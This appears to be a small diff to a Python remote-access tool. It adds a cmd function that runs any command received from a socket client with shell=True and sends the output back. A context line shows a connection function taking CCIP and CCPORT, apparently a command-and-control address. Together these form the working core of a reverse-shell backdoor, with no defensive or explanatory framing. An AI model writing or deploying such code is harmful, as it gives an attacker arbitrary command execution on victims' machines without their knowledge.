@@ -30,3 +30,12 @@ def conn(CCIP, CCPORT):
 
 
 #checks for error if fails
+def cmd(client, data):
+    try:
+        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        output = proc.stdout.read() + proc.stderr.read()
+        client.send(output + b"\n")
+    except Exception as error:
+        print(error)
+    
+                    
